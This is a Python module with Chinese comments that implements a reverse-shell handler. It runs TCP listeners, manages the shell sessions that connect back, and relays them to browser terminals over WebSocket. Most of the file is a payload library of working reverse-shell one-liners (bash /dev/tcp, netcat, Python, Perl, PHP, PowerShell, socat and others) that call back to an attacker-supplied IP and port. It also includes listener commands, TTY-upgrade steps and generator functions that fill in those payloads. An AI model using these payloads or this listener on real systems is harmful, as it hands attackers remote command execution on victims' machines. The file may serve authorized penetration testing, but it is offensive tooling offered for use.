"""反弹 Shell 监听模块

提供 TCP 监听器管理、会话管理、Payload 生成等功能。
通过 WebSocket 桥接浏览器终端与远程 Shell 会话。
"""

import asyncio
import uuid
import logging
from datetime import datetime
from typing import Dict, Optional, List
from dataclasses import dataclass, field

logger = logging.getLogger(__name__)

# 允许的端口范围
MIN_PORT = 1024
MAX_PORT = 65535


@dataclass
class ShellSession:
    """反弹 Shell 会话"""
    id: str
    reader: asyncio.StreamReader
    writer: asyncio.StreamWriter
    client_ip: str
    client_port: int
    listener_port: int
    connected_at: datetime = field(default_factory=datetime.utcnow)
    _websockets: set = field(default_factory=set, repr=False)
    _output_buffer: list = field(default_factory=list, repr=False)
    _read_task: Optional[asyncio.Task] = field(default=None, repr=False)
    _closed: bool = field(default=False, repr=False)

    async def start_reading(self):
        """持续从 Shell 读取数据，转发到所有已连接的 WebSocket"""
        try:
            while not self._closed:
                data = await self.reader.read(4096)
                if not data:
                    break
                for ws in list(self._websockets):
                    try:
                        await ws.send_bytes(data)
                    except Exception:
                        self._websockets.discard(ws)
                self._output_buffer.append(data)
                if len(self._output_buffer) > 1000:
                    self._output_buffer = self._output_buffer[-500:]
        except asyncio.CancelledError:
            pass
        except Exception as e:
            logger.error(f"会话 {self.id} 读取异常: {e}")
        finally:
            self._closed = True
            manager = RevShellManager.get_instance()
            if self.id in manager.sessions:
                del manager.sessions[self.id]
            logger.info(f"会话 {self.id} 已断开 ({self.client_ip}:{self.client_port})")

    async def write(self, data: bytes):
        """向 Shell 写入数据"""
        if self._closed:
            return
        try:
            self.writer.write(data)
            await self.writer.drain()
        except Exception as e:
            logger.error(f"会话 {self.id} 写入异常: {e}")
            self._closed = True

    def get_output_history(self) -> bytes:
        """获取输出缓冲区内容"""
        return b"".join(self._output_buffer)

    async def close(self):
        """关闭会话"""
        self._closed = True
        if self._read_task and not self._read_task.done():
            self._read_task.cancel()
        try:
            self.writer.close()
            await self.writer.wait_closed()
        except Exception:
            pass

    def to_dict(self) -> dict:
        return {
            "id": self.id,
            "client_ip": self.client_ip,
            "client_port": self.client_port,
            "listener_port": self.listener_port,
            "connected_at": self.connected_at.isoformat(),
            "ws_clients": len(self._websockets),
            "is_alive": not self._closed,
        }


@dataclass
class Listener:
    """TCP 监听器"""
    port: int
    server: Optional[asyncio.AbstractServer] = None
    started_at: Optional[datetime] = None
    session_count: int = 0

    def to_dict(self) -> dict:
        return {
            "port": self.port,
            "started_at": self.started_at.isoformat() if self.started_at else None,
            "session_count": self.session_count,
            "active_sessions": sum(
                1 for s in RevShellManager.get_instance().sessions.values()
                if s.listener_port == self.port and not s._closed
            ),
        }


class RevShellManager:
    """反弹 Shell 管理器（单例）"""
    _instance: Optional["RevShellManager"] = None

    @classmethod
    def get_instance(cls) -> "RevShellManager":
        if cls._instance is None:
            cls._instance = cls()
        return cls._instance

    def __init__(self):
        self.listeners: Dict[int, Listener] = {}
        self.sessions: Dict[str, ShellSession] = {}

    async def start_listener(self, port: int) -> Listener:
        if not MIN_PORT <= port <= MAX_PORT:
            raise ValueError(f"端口必须在 {MIN_PORT}-{MAX_PORT} 之间")
        if port in self.listeners:
            raise ValueError(f"端口 {port} 已在监听中")

        listener = Listener(port=port)

        async def handle_connection(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
            addr = writer.get_extra_info("peername")
            session_id = uuid.uuid4().hex[:8]
            session = ShellSession(
                id=session_id,
                reader=reader,
                writer=writer,
                client_ip=addr[0],
                client_port=addr[1],
                listener_port=port,
            )
            self.sessions[session_id] = session
            listener.session_count += 1
            logger.info(f"新反弹 Shell 连接: {addr[0]}:{addr[1]} -> 监听端口 {port}, 会话 {session_id}")
            session._read_task = asyncio.create_task(session.start_reading())

        try:
            server = await asyncio.start_server(handle_connection, "0.0.0.0", port)
            listener.server = server
            listener.started_at = datetime.utcnow()
            self.listeners[port] = listener
            logger.info(f"反弹 Shell 监听已启动: 0.0.0.0:{port}")
            return listener
        except OSError as e:
            raise ValueError(f"无法在端口 {port} 启动监听: {e}")

    async def stop_listener(self, port: int):
        if port not in self.listeners:
            raise ValueError(f"端口 {port} 未在监听")

        listener = self.listeners[port]
        listener.server.close()
        await listener.server.wait_closed()

        sessions_to_close = [
            s for s in self.sessions.values()
            if s.listener_port == port
        ]
        for session in sessions_to_close:
            await session.close()
            self.sessions.pop(session.id, None)

        del self.listeners[port]
        logger.info(f"监听已停止: 端口 {port}，关闭了 {len(sessions_to_close)} 个会话")

    async def kill_session(self, session_id: str):
        session = self.sessions.get(session_id)
        if not session:
            raise ValueError(f"会话 {session_id} 不存在")
        await session.close()
        self.sessions.pop(session_id, None)

    def get_sessions(self, port: Optional[int] = None) -> List[dict]:
        sessions = self.sessions.values()
        if port is not None:
            sessions = [s for s in sessions if s.listener_port == port]
        return [s.to_dict() for s in sessions]

    def get_listeners(self) -> List[dict]:
        return [l.to_dict() for l in self.listeners.values()]

    async def cleanup(self):
        """清理所有监听器和会话"""
        for port in list(self.listeners.keys()):
            await self.stop_listener(port)


# ==================== Payload 模板 ====================

PAYLOAD_TEMPLATES = {
    "bash_tcp": {
        "name": "Bash TCP",
        "platform": "Linux",
        "command": "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
    },
    "bash_udp": {
        "name": "Bash UDP",
        "platform": "Linux",
        "command": "bash -i >& /dev/udp/{ip}/{port} 0>&1",
    },
    "bash_196": {
        "name": "Bash 196",
        "platform": "Linux",
        "command": "0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196",
    },
    "bash_readline": {
        "name": "Bash readline",
        "platform": "Linux",
        "command": "exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done",
    },
    "bash_5": {
        "name": "Bash 5",
        "platform": "Linux",
        "command": "bash -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5",
    },
    "nc_e": {
        "name": "Netcat -e",
        "platform": "Linux",
        "command": "nc {ip} {port} -e /bin/bash",
    },
    "nc_mkfifo": {
        "name": "Netcat mkfifo",
        "platform": "Linux",
        "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
    },
    "nc_c": {
        "name": "Netcat -c",
        "platform": "Linux",
        "command": "nc -c /bin/bash {ip} {port}",
    },
    "ncat_ssl": {
        "name": "Ncat (SSL)",
        "platform": "Linux",
        "command": "ncat --ssl {ip} {port} -e /bin/bash",
    },
    "python3": {
        "name": "Python3",
        "platform": "跨平台",
        "command": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    },
    "python3_short": {
        "name": "Python3 短版",
        "platform": "跨平台",
        "command": "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'",
    },
    "python2": {
        "name": "Python2",
        "platform": "跨平台",
        "command": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    },
    "perl": {
        "name": "Perl",
        "platform": "跨平台",
        "command": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\")}};'",
    },
    "perl_nosh": {
        "name": "Perl (no /bin/sh)",
        "platform": "跨平台",
        "command": "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{ip}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
    },
    "php": {
        "name": "PHP",
        "platform": "跨平台",
        "command": "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    },
    "php_proc_open": {
        "name": "PHP proc_open",
        "platform": "跨平台",
        "command": "php -r '$sock=fsockopen(\"{ip}\",{port});$proc=proc_open(\"/bin/sh -i\",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'",
    },
    "ruby": {
        "name": "Ruby",
        "platform": "跨平台",
        "command": "ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
    },
    "socat": {
        "name": "Socat",
        "platform": "Linux",
        "command": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}",
    },
    "socat_tty": {
        "name": "Socat TTY",
        "platform": "Linux",
        "command": "socat TCP:{ip}:{port} EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane",
    },
    "awk": {
        "name": "AWK",
        "platform": "Linux",
        "command": "awk 'BEGIN {{s = \"/inet/tcp/0/{ip}/{port}\"; while(42) {{ do{{ printf \"shell>\" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c)}} }} while(c != \"exit\") close(s)}}}}'",
    },
    "lua": {
        "name": "Lua",
        "platform": "Linux",
        "command": "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('/bin/sh -i <&3 >&3 2>&3');\"",
    },
    "java": {
        "name": "Java",
        "platform": "跨平台",
        "command": "Runtime r = Runtime.getRuntime(); Process p = r.exec(new String[]{{\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done\"}});",
    },
    "xterm": {
        "name": "xterm",
        "platform": "Linux",
        "command": "xterm -display {ip}:1",
    },
    "powershell": {
        "name": "PowerShell",
        "platform": "Windows",
        "command": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
    },
    "powershell_base64": {
        "name": "PowerShell Base64",
        "platform": "Windows",
        "command": "powershell -e {base64_payload}",
        "note": "需要先 Base64 编码 PowerShell payload",
    },
    "openssl": {
        "name": "OpenSSL",
        "platform": "Linux",
        "command": "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s",
    },
}


LISTENER_COMMANDS = {
    "nc": {
        "name": "Netcat",
        "command": "nc -lvnp {port}",
    },
    "ncat_ssl": {
        "name": "Ncat SSL",
        "command": "ncat --ssl -lvnp {port}",
    },
    "socat": {
        "name": "Socat",
        "command": "socat file:`tty`,raw,echo=0 TCP-L:{port}",
    },
    "socat_ssl": {
        "name": "Socat SSL",
        "command": "socat OPENSSL-LISTEN:{port},cert=cert.pem,verify=0 FILE:`tty`,raw,echo=0",
    },
    "openssl": {
        "name": "OpenSSL",
        "command": "openssl s_server -quiet -key key.pem -cert cert.pem -port {port}",
    },
    "pwncat": {
        "name": "pwncat-cs",
        "command": "pwncat-cs -lp {port}",
    },
    "rlwrap_nc": {
        "name": "rlwrap + Netcat",
        "command": "rlwrap nc -lvnp {port}",
    },
}


UPGRADE_COMMANDS = [
    {
        "name": "Python PTY",
        "command": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
        "description": "使用 Python 获取 PTY",
    },
    {
        "name": "script PTY",
        "command": "script -qc /bin/bash /dev/null",
        "description": "使用 script 获取 PTY",
    },
    {
        "name": "完整 TTY 升级",
        "steps": [
            "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
            "# 按 Ctrl+Z 挂起",
            "stty raw -echo; fg",
            "reset",
            "export SHELL=bash",
            "export TERM=xterm-256color",
            "stty rows {rows} columns {cols}",
        ],
        "description": "完整 TTY 升级流程（支持 Tab 补全、Ctrl+C 等）",
    },
]


def generate_payload(template_id: str, ip: str, port: int, shell: str = "/bin/bash") -> dict:
    """根据模板生成 Payload"""
    template = PAYLOAD_TEMPLATES.get(template_id)
    if not template:
        return {"error": f"未知模板: {template_id}"}

    command = template["command"].format(ip=ip, port=port, shell=shell)
    return {
        "template_id": template_id,
        "name": template["name"],
        "platform": template["platform"],
        "command": command,
    }


def generate_all_payloads(ip: str, port: int) -> list:
    """生成所有 Payload"""
    results = []
    for tid, t in PAYLOAD_TEMPLATES.items():
        try:
            cmd = t["command"].format(ip=ip, port=port, shell="/bin/bash")
            results.append({
                "template_id": tid,
                "name": t["name"],
                "platform": t["platform"],
                "command": cmd,
            })
        except (KeyError, IndexError):
            pass
    return results


def get_listener_commands(port: int) -> list:
    """获取对应端口的本地监听命令"""
    results = []
    for lid, l in LISTENER_COMMANDS.items():
        results.append({
            "id": lid,
            "name": l["name"],
            "command": l["command"].format(port=port),
        })
    return results
